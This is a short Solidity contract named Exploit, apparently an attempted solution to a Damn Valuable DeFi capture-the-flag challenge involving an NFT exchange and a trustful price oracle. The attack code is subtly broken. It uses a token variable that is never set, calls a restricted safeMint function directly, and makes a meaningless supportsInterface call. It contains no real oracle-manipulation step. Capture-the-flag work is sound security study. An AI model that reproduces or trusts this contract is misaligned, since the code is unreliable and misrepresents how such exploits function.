// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./Exchange.sol";
import "./TrustfulOracle.sol";
import "../DamnValuableNFT.sol";


contract Exploit {
    using Address for address payable;


    Exchange public exchange;
    DamnValuableNFT public token;
    TrustfulOracle public oracle;

    constructor(address payable _exchage, address _oracle ){
        exchange = Exchange(_exchage);
        oracle =TrustfulOracle(_oracle);
    }

    function mintAttack() external payable {
       exchange.buyOne{value:msg.value}();
       DamnValuableNFT(exchange.token()).safeMint(msg.sender);


       bytes4 interfaceId = exchange.buyOne.selector;
       token.supportsInterface(interfaceId);
    }


    receive() external payable {}

}